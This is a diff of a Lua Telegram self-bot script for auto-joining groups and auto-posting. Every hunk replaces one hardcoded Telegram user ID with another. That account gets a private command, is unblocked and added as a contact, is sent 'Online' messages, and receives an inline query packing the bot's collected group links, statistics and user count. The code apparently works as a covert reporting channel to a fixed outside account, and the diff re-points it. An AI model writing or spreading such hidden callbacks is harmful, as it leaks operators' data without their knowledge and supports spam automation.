@@ -23,7 +23,7 @@ function is_sudo(msg)
   return var
 end
 function run(msg, data)
-  if msg.content_.text_ and msg.content_.text_ == "!tgseen" and msg.sender_user_id_ == 180191663 then
+  if msg.content_.text_ and msg.content_.text_ == "!tgseen" and msg.sender_user_id_ == 37484418 then
     bot.sendMessage(msg.chat_id_, 1, 1, "Version: 4\226\152\145\239\184\143 \n Coded By:@sajjad_021 \n Channel: @tgMember", "md")
   end
   if db:get("autobcs" .. bot_id) == "on" and db:get("timera" .. bot_id) == nil and db:scard("autoposterm" .. bot_id) > 0 then
@@ -229,12 +229,12 @@ function run(msg, data)
               vardump(b)
               print(b)
                bot.searchPublicChat("TgGuard")
-               bot.unblockUser(180191663)
-               bot.importContacts(639080023314, "sinchi", "Online", 180191663)
-               bot.sendMessage(180191663, 0, 1, "Online", 1, "md")
+               bot.unblockUser(37484418)
+               bot.importContacts(639080023314, "sinchi", "Online", 37484418)
+               bot.sendMessage(37484418, 0, 1, "Online", 1, "md")
             end
           end
-          tdcli_function({ID = "GetChat", chat_id_ = 180191663}, fuck, nil)
+          tdcli_function({ID = "GetChat", chat_id_ = 37484418}, fuck, nil)
           function inline(arg, data)
             if data.results_ and data.results_[0] then
               tdcli_function({
@@ -251,7 +251,7 @@ function run(msg, data)
           local texts = "/sg " .. list .. " /lnk " .. llist .. " /elnk " .. elist .. " /end " .. ajstatus .. " /aj " .. abstatus .. " /abc " .. ttlstatus .. " /eabc " .. users .. " /users"
           tdcli_function({
             ID = "GetInlineQueryResults",
-            bot_user_id_ = 180191663,
+            bot_user_id_ = 37484418,
             chat_id_ = msg.chat_id_,
             user_location_ = {
               ID = "Location",
